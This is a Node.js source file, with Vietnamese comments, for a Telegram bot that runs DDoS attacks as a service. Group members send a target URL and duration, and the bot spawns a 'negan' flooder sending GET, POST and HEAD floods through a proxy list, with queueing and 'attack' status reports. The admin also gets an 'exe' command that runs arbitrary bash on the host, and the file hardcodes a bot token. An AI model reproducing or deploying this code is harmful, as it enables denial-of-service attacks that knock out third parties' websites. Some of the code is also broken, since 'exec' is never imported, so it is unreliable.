const TelegramBot = require('node-telegram-bot-api'),
    { spawn } = require('child_process'), // Sử dụng spawn thay vì exec
    token = '7935173392:AAFMBexmTDJ7aNveu4CkgtCbM4Q92mRJK0A',
    adminId = 7371969470,
    allowedGroupIds = new Set([-1002411881962, -1002334544605, -1002365124072, -1002345371324, 998877665]),
    bot = new TelegramBot(token, { polling: true }),
    maxSlot = 1, // Số lượng slot tối đa cho mỗi người dùng
    maxCurrent = 3, // Số lượng tiến trình tối đa cùng lúc
    maxTimeAttacks = 120;

let currentProcesses = 0,
    queue = [],
    userProcesses = {},
    activeAttacks = {},
    botStartTime = Date.now(); // Thời điểm bot khởi động

const restartBot = () => {
    console.error('🚨 Restarting bot...');
    bot.stopPolling();
    setTimeout(() => {
        bot = new TelegramBot(token, { polling: true });
        initBot();
    }, 1000);
};

const initBot = () => {
    bot.sendMessage(adminId, '[🤖Version PRO🤖] BOT Đang Chờ Lệnh.');
    const helpMessage = `📜 Hướng dẫn sử dụng:\n➔ Lệnh chính xác: <code>https://example.com 120</code>\n➔ Lệnh full: <code>https://example.com 120 full</code>\n⚠️ Lưu ý: Thời gian tối đa là ${maxTimeAttacks} giây.`;

    bot.on('message', async msg => {
        const { chat: { id: chatId }, text, from: { id: userId, username, first_name }, date } = msg,
            isAdmin = chatId === adminId,
            isGroup = allowedGroupIds.has(chatId),
            caller = username || first_name;

        // Kiểm tra nếu lệnh được gửi trước khi bot online
        if (date * 1000 < botStartTime) {
            return; // Bỏ qua lệnh mà không thông báo
        }

        if (!isAdmin && !isGroup) return bot.sendMessage(chatId, '❌ Bạn không có quyền sử dụng liên hệ: https://t.me/NeganSSHConsole.', { parse_mode: 'HTML' });
        if (!text || !['http://', 'https://', 'exe ', '/help'].some(cmd => text.startsWith(cmd))) return;
        if (text === '/help') return bot.sendMessage(chatId, helpMessage, { parse_mode: 'HTML' });

        if (text.startsWith('http')) {
            const [host, time, full] = text.split(' ');
            if (!host || isNaN(time)) return bot.sendMessage(chatId, '🚫 Sai định dạng! Nhập theo: <code>https://example.com 120</code> hoặc <code>https://example.com 120 full</code>.', { parse_mode: 'HTML' });
            const attackTime = Math.min(parseInt(time, 10), maxTimeAttacks);
            const isFullAttack = full === 'full'; // Kiểm tra xem có phải là tấn công full không

            // Kiểm tra số lượng tiến trình hiện tại của người dùng
            if (userProcesses[userId] >= maxSlot) {
                return bot.sendMessage(chatId, `❌ Bạn đã đạt giới hạn số lượng tiến trình (${maxSlot}).`);
            }

            if (currentProcesses >= maxCurrent) {
                queue.push({ userId, host, time: attackTime, chatId, caller, isFullAttack });
                return bot.sendMessage(chatId, '⏳ Yêu cầu được đưa vào hàng đợi...', { parse_mode: 'HTML' });
            }

            const pid = Math.floor(Math.random() * 10000),
                endTime = Date.now() + attackTime * 1000;
            activeAttacks[pid] = { userId, endTime, commands: isFullAttack ? 3 : 1, completedCommands: 0 }; // Số lệnh cần chạy
            userProcesses[userId] = (userProcesses[userId] || 0) + 1;
            currentProcesses++;

            const methods = isFullAttack ? ['GET', 'POST', 'HEAD'] : ['GET']; // Phương thức sẽ chạy
            const startMessage = JSON.stringify({
                Status: "✨🚀🛸 Successfully 🛸🚀✨",
                Caller: caller,
                "PID Attack": pid,
                Website: host,
                Time: `${attackTime} Giây`,
                Maxslot: maxSlot,
                Maxtime: maxTimeAttacks,
                ConcurrentAttacks: currentProcesses,
                Methods: methods, // Thêm trường Methods
                StartTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }),
                CheckHostURL: `Check Host (https://check-host.net/check-http?host=${host})`,
                HostTracker: `Host Tracker (https://www.host-tracker.com/en/ic/check-http?url=${host})`
            }, null, 2).replace(/"Methods": \[\s*"([^"]+)"\s*\]/g, '"Methods": ["$1"]'); // Sửa định dạng Methods

            await bot.sendMessage(chatId, startMessage, { parse_mode: 'HTML', reply_markup: { inline_keyboard: [[{ text: 'Check Host', url: `https://check-host.net/check-http?host=${host}` }, { text: 'Host Tracker', url: `https://www.host-tracker.com/en/ic/check-http?url=${host}` }]] } });

            // Tăng heap size lên 8GB
            const nodeOptions = '--max-old-space-size=8192';

            // Chạy lệnh tùy thuộc vào phương thức
            if (isFullAttack) {
                // Chạy đồng thời 3 lệnh spawn với các phương thức HTTP khác nhau
                runCommand(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
                runCommand(`${nodeOptions} node ./negan -m POST -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
                runCommand(`${nodeOptions} node ./negan -m HEAD -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
            } else {
                // Chỉ chạy phương thức GET
                runCommand(`${nodeOptions} node ./negan -m GET -u ${host} -p live.txt --full true -s ${attackTime}`, pid, userId, chatId, caller, host, attackTime);
            }

            return;
        }

        if (text.startsWith('exe ') && isAdmin) {
            const cmd = text.slice(4);
            if (!cmd) return bot.sendMessage(chatId, '🚫 Lệnh không được trống! VD: <code>exe ls</code>', { parse_mode: 'HTML' });
            exec(cmd, { shell: '/bin/bash' }, (e, o, er) => bot.sendMessage(chatId, `🚀 Kết quả lệnh:\n<pre>${cmd}\n${o || er}</pre>`, { parse_mode: 'HTML' }));
        }
    });

    bot.on('polling_error', restartBot);
    process.on('uncaughtException', restartBot);
    process.on('unhandledRejection', restartBot);
};

const runCommand = (command, pid, userId, chatId, caller, host, attackTime) => {
    console.log(`🚀 Đang chạy lệnh: ${command}`); // Debug log
    const child = spawn(command, { shell: true });

    child.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`); // Debug log
    });

    child.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`); // Debug log
    });

    child.on('close', (code) => {
        console.log(`Lệnh ${command} đã kết thúc với mã ${code}`); // Debug log
        handleCommandCompletion(null, null, null, pid, userId, chatId, caller, host, attackTime);
    });

    child.on('error', (err) => {
        console.error(`Lỗi khi chạy lệnh ${command}:`, err); // Debug log
        handleCommandCompletion(err, null, null, pid, userId, chatId, caller, host, attackTime);
    });

    // Thêm thời gian chờ để đảm bảo lệnh không kết thúc quá sớm
    setTimeout(() => {
        if (!child.killed) {
            child.kill(); // Đảm bảo lệnh kết thúc sau khi hết thời gian
        }
    }, attackTime * 1000);
};

const handleCommandCompletion = (e, stdout, stderr, pid, userId, chatId, caller, host, attackTime) => {
    const attack = activeAttacks[pid];
    if (!attack) return; // Nếu không tìm thấy cuộc tấn công, bỏ qua

    attack.completedCommands++; // Tăng số lệnh đã hoàn thành

    // Kiểm tra nếu tất cả các lệnh đã hoàn thành
    if (attack.completedCommands === attack.commands) {
        const completeMessage = JSON.stringify({ Status: "👽 END ATTACK 👽", Caller: caller, "PID Attack": pid, Website: host, Time: `${attackTime} Giây`, EndTime: new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' }) }, null, 2);
        bot.sendMessage(chatId, completeMessage, { parse_mode: 'HTML' });
        delete activeAttacks[pid];
        userProcesses[userId]--;
        currentProcesses--;

        if (queue.length) {
            const next = queue.shift();
            bot.sendMessage(next.chatId, `📥 Khởi động từ hàng đợi: ${next.host} ${next.time}s`);
            bot.emit('message', { chat: { id: next.chatId }, from: { id: next.userId, username: next.caller }, text: `${next.host} ${next.time}` });
        }
    }
};

initBot();
